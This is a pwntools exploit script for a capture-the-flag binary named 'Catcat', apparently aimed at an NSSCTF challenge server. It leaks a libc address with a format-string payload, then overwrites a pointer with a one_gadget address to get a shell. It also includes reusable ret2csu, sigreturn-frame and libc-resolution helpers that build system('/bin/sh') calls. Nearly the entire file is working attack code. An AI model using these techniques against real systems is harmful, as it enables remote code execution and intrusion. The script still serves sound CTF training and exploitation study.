from pwn import *
from LibcSearcher import *
from ae64 import AE64

context(arch="amd64", os="linux", log_level="debug")
context.terminal = ["tmux", "split", "-h"]
# context(arch="amd64",os="linux",log_level="debug")
binary = "./Catcat/Catcat"
libc_addr = "./Catcat/libc.so.6"
ld_addr = "../../glibc-all-in-one/libs/2.31-0ubuntu9_i386/ld-2.31.so"

rop = ROP(binary)
elf = ELF(binary)

libc = ELF(libc_addr)
ld = ELF(ld_addr)
# libc_dll = cdll.LoadLibrary(libc)


local = 1

ip, port = "61.147.171.105", 21355
# ip, port = "chall.pwnable.tw" 1
if local == 0:
    p = process(binary)
    dbg = lambda p: gdb.attach(p)
    libc_addr = "/lib/x86_64-linux-gnu/libc.so.6"
    libc = ELF(libc_addr)
else:
    # p = remote(ip, port)
    # p = remote("pwn.challenge.ctf.show",port)
    # p = remote("node5.buuoj.cn", port)
    p = remote("node5.anna.nssctf.cn", port)
    dbg = lambda _: None


ls = lambda addr: log.success(hex(addr))


def search(func_name: str, func_addr: int):
    log.success(func_name + ": " + hex(func_addr))
    libc = LibcSearcher(func_name, func_addr)
    offset = func_addr - libc.dump(func_name)
    binsh = offset + libc.dump("str_bin_sh")
    system = offset + libc.dump("system")
    log.success("offset: " + hex(offset))
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


def search_from_libc(func_name: str, func_addr: int, libc=libc):
    log.success(func_name + ": " + hex(func_addr))
    offset = func_addr - libc.symbols[func_name]
    binsh = offset + libc.search(b"/bin/sh").__next__()
    system = offset + libc.symbols["system"]
    log.success("offset: " + hex(offset))
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


# __libc_start_main

csu_start = 0x0


def csu(edi=0, rsi=0, rdx=0, r12=0, start=csu_start):
    end = start + 0x1A
    payload = p64(end)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    payload += p64(r12)  # r12
    payload += p64(edi)  # edi
    payload += p64(rsi)  # rsi
    payload += p64(rdx)  # rdx
    payload += p64(start)
    payload += b"a" * 56
    return payload


def sig(rax=0, rdi=0, rsi=0, rdx=0, rsp=0, rip=0):
    sigframe = SigreturnFrame()
    sigframe.rax = rax
    sigframe.rdi = rdi  # "/bin/sh" 's addr
    sigframe.rsi = rsi
    sigframe.rdx = rdx
    sigframe.rsp = rsp
    sigframe.rip = rip
    return bytes(sigframe)


# =================start=================#

# offset ==> 10


def add(name):
    p.sendlineafter(b">>", str(1).encode())
    p.sendafter(b"name:\n", name)
    p.sendlineafter(b"for your cat\n", str(1).encode())


def change(idx, name, true_idx):
    p.sendlineafter(b">>", str(2).encode())
    p.sendlineafter(b"index\n", str(idx).encode())
    choice = b"yes\0"
    choice = choice.ljust(0x20, b"a")
    choice += str(true_idx).encode()
    p.sendafter(b"?\n", choice)
    p.sendafter(b"name:\n", name)


def show():
    p.sendlineafter(b"\n>>", str(3).encode())


# payload = b"%35$p|"
# 55
payload = b"%35$p|"

add(payload)
show()
p.recvuntil(b"0x")

# libc_offset = int(p.recvuntil(b"|", drop=True), 16) - libc.sym.__libc_start_main - 133
libc_offset = int(p.recvuntil(b"|", drop=True), 16) - 0x29D90

libc.address = libc_offset

off = 0xEBD52
off = 0xEBCF1
off = 0xEBDB3
off = 0xEBDAF
off = 0xEBDA8
off = 0xEBCF8
off = 0x50A37
one = off + libc_offset

dbg(p)

change(3, p64(0) + p32(one & 0xFFFFFFFF), 8)

add(b"w")
add(b"w")
add(b"w")
ls(libc_offset)
ls(one)


p.interactive()
